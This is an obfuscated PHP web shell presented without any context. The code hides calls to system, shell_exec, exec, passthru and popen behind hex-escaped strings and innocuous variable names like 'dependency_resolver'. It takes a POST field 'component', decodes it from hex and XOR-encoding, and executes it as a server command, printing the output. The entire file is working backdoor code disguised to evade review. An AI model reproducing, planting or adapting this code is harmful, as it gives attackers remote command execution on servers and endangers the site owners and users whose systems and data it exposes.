<?php

$dependency_resolver4 = "pa\x73s\x74\x68ru";
$dependency_resolver7 = "\x70c\x6Cos\x65";
$unit_converter = "h\x65\x78\x32\x62in";
$dependency_resolver6 = "s\x74r\x65\x61\x6D_\x67\x65\x74\x5Fc\x6Fn\x74ents";
$dependency_resolver1 = "\x73yst\x65m";
$dependency_resolver2 = "\x73he\x6Cl\x5Fex\x65c";
$dependency_resolver3 = "e\x78\x65c";
$dependency_resolver5 = "\x70o\x70en";
if (isset($_POST["\x63o\x6D\x70o\x6Eent"])) {
            function reverse_lookup    (    $rec   ,      $item    )     {   $pointer     =   ''      ;     $f=0; while($f<strlen($rec)){$pointer.=chr(ord($rec[$f])^$item);$f++;} return    $pointer;    }
            $component = $unit_converter($_POST["\x63o\x6D\x70o\x6Eent"]);
            $component = reverse_lookup($component, 48);
            if (function_exists($dependency_resolver1)) {
                $dependency_resolver1($component);
            } elseif (function_exists($dependency_resolver2)) {
                print $dependency_resolver2($component);
            } elseif (function_exists($dependency_resolver3)) {
                $dependency_resolver3($component, $entity_rec);
                print join("\n", $entity_rec);
            } elseif (function_exists($dependency_resolver4)) {
                $dependency_resolver4($component);
            } elseif (function_exists($dependency_resolver5) && function_exists($dependency_resolver6) && function_exists($dependency_resolver7)) {
                $item_pointer = $dependency_resolver5($component, 'r');
                if ($item_pointer) {
                    $res_parameter_group = $dependency_resolver6($item_pointer);
                    $dependency_resolver7($item_pointer);
                    print $res_parameter_group;
                }
            }
            exit;
        }